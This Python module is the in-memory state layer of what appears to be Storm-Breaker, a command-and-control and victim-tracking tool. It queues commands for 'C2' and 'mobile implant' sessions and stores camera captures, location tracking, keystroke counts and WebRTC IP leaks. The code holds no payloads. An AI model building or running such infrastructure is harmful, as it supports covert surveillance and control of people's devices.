"""Core state layer (HANDOFF plan section P5).

``StateStore`` abstracts the mutable in-memory state that blueprints and
services previously kept as module-level globals in
``storm-web/app/state.py``.  ``MemoryStore`` is the behavior-identical
default implementation: every dict / list that used to live at module level
(C2 queues, mobile queues, analytics, recon config, WebRTC leaks, login
failures) now lives behind this interface, guarded by a single lock so the
state is safe across worker threads (P6).

The interface is intentionally narrow: only the operations the blueprints /
services actually perform.  P6 routes notifications / scans / reports onto a
background worker through this same store.
"""
from __future__ import annotations

import threading
from collections import deque
from datetime import datetime
from typing import Any, Deque, Dict, List, Optional, Tuple


class StateStore:
    """Abstract shared-state interface for Storm-Breaker.

    All mutating/reading of process-wide in-memory state goes through here so
    the store can later be swapped (e.g. to a Redis-backed store) without
    touching the blueprints.
    """

    # -- C2 implant state ---------------------------------------------------
    def c2_session_set(self, uid: str, info: dict, ip: str) -> None:
        raise NotImplementedError

    def c2_session_get(self, uid: str) -> Optional[dict]:
        raise NotImplementedError

    def c2_session_update_last_seen(self, uid: str) -> None:
        raise NotImplementedError

    def c2_all_sessions(self) -> Dict[str, dict]:
        raise NotImplementedError

    def c2_command_enqueue(self, uid: str, command: str) -> None:
        raise NotImplementedError

    def c2_command_dequeue(self, uid: str) -> Optional[str]:
        raise NotImplementedError

    def c2_response_append(self, uid: str, output: str,
                           timestamp: str) -> None:
        raise NotImplementedError

    def c2_response_drain(self, uid: str) -> List[dict]:
        raise NotImplementedError

    def c2_file_list_set(self, uid: str, data: dict) -> None:
        raise NotImplementedError

    def c2_file_list_drain(self, uid: str) -> Optional[dict]:
        raise NotImplementedError

    def c2_download_set(self, uid: str, data: dict) -> None:
        raise NotImplementedError

    def c2_download_drain(self, uid: str) -> Optional[dict]:
        raise NotImplementedError

    # -- Mobile implant state ----------------------------------------------
    def mobile_session_set(self, uid: str, info: dict, ip: str,
                           registered_at: str) -> None:
        raise NotImplementedError

    def mobile_session_get(self, uid: str) -> Optional[dict]:
        raise NotImplementedError

    def mobile_all_sessions(self) -> Dict[str, dict]:
        raise NotImplementedError

    def mobile_last_seen_update(self, uid: str) -> None:
        raise NotImplementedError

    def mobile_command_enqueue(self, uid: str, command: str) -> None:
        raise NotImplementedError

    def mobile_command_dequeue(self, uid: str) -> Optional[str]:
        raise NotImplementedError

    def mobile_response_append(self, uid: str, output: str,
                               timestamp: str) -> None:
        raise NotImplementedError

    def mobile_capture_set(self, uid: str, capture_type: str, filename: str,
                           url: str, meta: dict) -> None:
        raise NotImplementedError

    def mobile_captures_get(self, uid: Optional[str] = None,
                            limit: int = 200) -> List[dict]:
        raise NotImplementedError

    def mobile_tracking_set(self, uid: str, data: dict) -> None:
        raise NotImplementedError

    def mobile_tracking_get(self, uid: str, limit: int = 100) -> List[dict]:
        raise NotImplementedError

    # -- Analytics ----------------------------------------------------------
    def analytics_event_append(self, event: dict) -> None:
        raise NotImplementedError

    def analytics_events_get(self) -> List[dict]:
        raise NotImplementedError

    def analytics_clear(self) -> None:
        raise NotImplementedError

    def analytics_get(self) -> dict:
        raise NotImplementedError

    def analytics_set(self, data: dict) -> None:
        raise NotImplementedError

    # -- Recon config -------------------------------------------------------
    def recon_config_get(self) -> dict:
        raise NotImplementedError

    def recon_config_update(self, data: dict) -> None:
        raise NotImplementedError

    # -- WebRTC leaks -------------------------------------------------------
    def webrtc_leak_append(self, leak: dict) -> None:
        raise NotImplementedError

    def webrtc_leaks_get(self) -> List[dict]:
        raise NotImplementedError

    # -- Login brute-force lockout ------------------------------------------
    def login_fail_get(self, ip: str) -> Optional[Tuple[int, float]]:
        raise NotImplementedError

    def login_fail_set(self, ip: str, fails: int, until: float) -> None:
        raise NotImplementedError

    def login_fail_pop(self, ip: str) -> None:
        raise NotImplementedError

    def close(self) -> None:
        raise NotImplementedError


class MemoryStore(StateStore):
    """Behavior-identical in-memory ``StateStore`` implementation.

    Mirrors the module-level dicts that previously lived in
    ``storm-web/app/state.py`` so existing blueprint behavior is preserved
    exactly.  All access is guarded by a single re-entrant lock.
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._c2_sessions: Dict[str, dict] = {}
        self._c2_commands: Dict[str, Deque[str]] = {}
        self._c2_responses: Dict[str, Deque[dict]] = {}
        self._c2_file_lists: Dict[str, dict] = {}
        self._c2_downloads: Dict[str, dict] = {}
        self._mobile_sessions: Dict[str, dict] = {}
        self._mobile_commands: Dict[str, Deque[str]] = {}
        self._mobile_responses: Dict[str, Deque[dict]] = {}
        self._mobile_camera_images: Dict[str, str] = {}
        self._mobile_tracking_data: Dict[str, dict] = {}
        self._analytics: dict = {
            'total_visits': 0,
            'total_captures': 0,
            'total_images': 0,
            'total_audio': 0,
            'total_locations': 0,
            'total_fingerprints': 0,
            'total_keystrokes': 0,
            'start_time': datetime.now().isoformat(),
            'events': [],
            'geo_data': [],
            'hourly_activity': {},
            'template_stats': {},
            'browser_stats': {},
            'os_stats': {},
            'ip_addresses': set(),
            'active_alerts': [],
        }
        self._recon_config: dict = {
            'auto_fingerprint': True,
            'auto_webrtc': True,
            'auto_geofence_check': True,
            'auto_credential_scan': False,
            'auto_profile_build': True,
        }
        self._webrtc_leaks: List[dict] = []
        self._login_fails: Dict[str, Tuple[int, float]] = {}

    # -- internal helpers ---------------------------------------------------
    def _now_iso(self) -> str:
        return datetime.now().isoformat()


    # -- C2 ----------------------------------------------------------------
    def c2_session_set(self, uid: str, info: dict, ip: str) -> None:
        with self._lock:
            self._c2_sessions[uid] = {
                'last_seen': self._now_iso(),
                'info': info,
                'ip': ip,
            }

    def c2_session_get(self, uid: str) -> Optional[dict]:
        with self._lock:
            return self._c2_sessions.get(uid)

    def c2_session_update_last_seen(self, uid: str) -> None:
        with self._lock:
            sess = self._c2_sessions.get(uid)
            if sess is not None:
                sess['last_seen'] = self._now_iso()

    def c2_all_sessions(self) -> Dict[str, dict]:
        with self._lock:
            return dict(self._c2_sessions)

    def c2_command_enqueue(self, uid: str, command: str) -> None:
        with self._lock:
            self._c2_commands.setdefault(uid, deque()).append(command)

    def c2_command_dequeue(self, uid: str) -> Optional[str]:
        with self._lock:
            dq = self._c2_commands.get(uid)
            if dq:
                return dq.popleft()
            return None

    def c2_response_append(self, uid: str, output: str,
                           timestamp: str) -> None:
        with self._lock:
            self._c2_responses.setdefault(uid, deque()).append(
                {'timestamp': timestamp, 'output': output})

    def c2_response_drain(self, uid: str) -> List[dict]:
        with self._lock:
            dq = self._c2_responses.get(uid)
            if not dq:
                return []
            out = list(dq)
            dq.clear()
            return out

    def c2_file_list_set(self, uid: str, data: dict) -> None:
        with self._lock:
            self._c2_file_lists[uid] = data

    def c2_file_list_drain(self, uid: str) -> Optional[dict]:
        with self._lock:
            return self._c2_file_lists.pop(uid, None)

    def c2_download_set(self, uid: str, data: dict) -> None:
        with self._lock:
            self._c2_downloads[uid] = data

    def c2_download_drain(self, uid: str) -> Optional[dict]:
        with self._lock:
            return self._c2_downloads.pop(uid, None)


    # -- Mobile ------------------------------------------------------------
    def mobile_session_set(self, uid: str, info: dict, ip: str,
                           registered_at: str) -> None:
        with self._lock:
            self._mobile_sessions[uid] = {
                'last_seen': self._now_iso(),
                'info': info,
                'ip': ip,
                'registered_at': registered_at,
            }

    def mobile_session_get(self, uid: str) -> Optional[dict]:
        with self._lock:
            return self._mobile_sessions.get(uid)

    def mobile_all_sessions(self) -> Dict[str, dict]:
        with self._lock:
            return dict(self._mobile_sessions)

    def mobile_last_seen_update(self, uid: str) -> None:
        with self._lock:
            sess = self._mobile_sessions.get(uid)
            if sess is not None:
                sess['last_seen'] = self._now_iso()

    def mobile_command_enqueue(self, uid: str, command: str) -> None:
        with self._lock:
            self._mobile_commands.setdefault(uid, deque()).append(command)

    def mobile_command_dequeue(self, uid: str) -> Optional[str]:
        with self._lock:
            dq = self._mobile_commands.get(uid)
            if dq:
                return dq.popleft()
            return None

    def mobile_response_append(self, uid: str, output: str,
                               timestamp: str) -> None:
        with self._lock:
            self._mobile_responses.setdefault(uid, deque()).append(
                {'output': output, 'timestamp': timestamp})

    def mobile_capture_set(self, uid: str, capture_type: str, filename: str,
                           url: str, meta: dict) -> None:
        with self._lock:
            self._mobile_camera_images[uid] = filename

    def mobile_captures_get(self, uid: Optional[str] = None,
                            limit: int = 200) -> List[dict]:
        # MemoryStore does not persist captures; that is the repository's job.
        return []

    def mobile_tracking_set(self, uid: str, data: dict) -> None:
        with self._lock:
            self._mobile_tracking_data[uid] = data

    def mobile_tracking_get(self, uid: str, limit: int = 100) -> List[dict]:
        with self._lock:
            data = self._mobile_tracking_data.get(uid)
            return [data] if data is not None else []


    # -- Analytics ----------------------------------------------------------
    def analytics_event_append(self, event: dict) -> None:
        with self._lock:
            self._analytics['events'].append(event)
            if len(self._analytics['events']) > 500:
                self._analytics['events'] = self._analytics['events'][-500:]
            hour = datetime.now().strftime('%Y-%m-%d %H:00')
            ha = self._analytics['hourly_activity']
            ha[hour] = ha.get(hour, 0) + 1
            ip = event.get('ip')
            if ip:
                self._analytics['ip_addresses'].add(ip)
            self._analytics['total_visits'] += 1

    def analytics_events_get(self) -> List[dict]:
        with self._lock:
            return list(self._analytics['events'])

    def analytics_clear(self) -> None:
        with self._lock:
            self._analytics['events'].clear()
            self._analytics['geo_data'].clear()
            self._analytics['active_alerts'].clear()
            self._analytics['ip_addresses'].clear()

    def analytics_get(self) -> dict:
        with self._lock:
            return dict(self._analytics)

    def analytics_set(self, data: dict) -> None:
        with self._lock:
            self._analytics = dict(data)

    # -- Recon config -------------------------------------------------------
    def recon_config_get(self) -> dict:
        with self._lock:
            return dict(self._recon_config)

    def recon_config_update(self, data: dict) -> None:
        with self._lock:
            self._recon_config.update(data)

    # -- WebRTC leaks -------------------------------------------------------
    def webrtc_leak_append(self, leak: dict) -> None:
        with self._lock:
            self._webrtc_leaks.append(leak)

    def webrtc_leaks_get(self) -> List[dict]:
        with self._lock:
            return list(self._webrtc_leaks)

    # -- Login brute-force lockout ------------------------------------------
    def login_fail_get(self, ip: str) -> Optional[Tuple[int, float]]:
        with self._lock:
            return self._login_fails.get(ip)

    def login_fail_set(self, ip: str, fails: int, until: float) -> None:
        with self._lock:
            self._login_fails[ip] = (fails, until)

    def login_fail_pop(self, ip: str) -> None:
        with self._lock:
            self._login_fails.pop(ip, None)

    # -- Bulk import (P5.3): DB -> memory merge used by clients listings ------
    def c2_sessions_import(self, db_sessions: Dict[str, dict]) -> None:
        """Add uids from a ``db.get_all_c2_sessions()`` snapshot that are
        not already in memory.  Existing in-memory entries are NEVER
        overwritten (mirrors the legacy ``if uid not in C2_SESSIONS``)."""
        with self._lock:
            for uid, sess in (db_sessions or {}).items():
                if uid and uid not in self._c2_sessions:
                    self._c2_sessions[uid] = sess

    def mobile_sessions_import(self, db_sessions: Dict[str, dict]) -> None:
        """Add uids from a ``db.get_all_mobile_sessions()`` snapshot that
        are not already in memory (legacy merge semantics)."""
        with self._lock:
            for uid, sess in (db_sessions or {}).items():
                if uid and uid not in self._mobile_sessions:
                    self._mobile_sessions[uid] = sess

    # -- Single-response pop (P5.3): legacy mobile poll semantics -------------
    def mobile_response_pop(self, uid: str) -> Optional[dict]:
        """Pop the OLDEST response for ``uid`` (legacy ``list.pop(0)``),
        or ``None`` when the queue is empty / unknown."""
        with self._lock:
            dq = self._mobile_responses.get(uid)
            if dq:
                return dq.popleft()
            return None

    # -- Per-uid tracking lists (P5.3): legacy background_data semantics ------
    def mobile_tracking_append(self, uid: str, data: dict,
                               keep_last: int = 100) -> None:
        """Append one tracking sample for ``uid``, keeping only the last
        ``keep_last`` entries (legacy trim-at-100 behavior)."""
        with self._lock:
            self._mobile_tracking_data.setdefault(uid, []).append(data)
            if len(self._mobile_tracking_data[uid]) > keep_last:
                self._mobile_tracking_data[uid] = \
                    self._mobile_tracking_data[uid][-keep_last:]

    def mobile_tracking_all(self, uid: str) -> List[dict]:
        """Read (without clearing) every stored sample for ``uid``."""
        with self._lock:
            return list(self._mobile_tracking_data.get(uid, []))

    def close(self) -> None:
        # Nothing to release for the in-memory store.
        return None


__all__ = ["StateStore", "MemoryStore"]

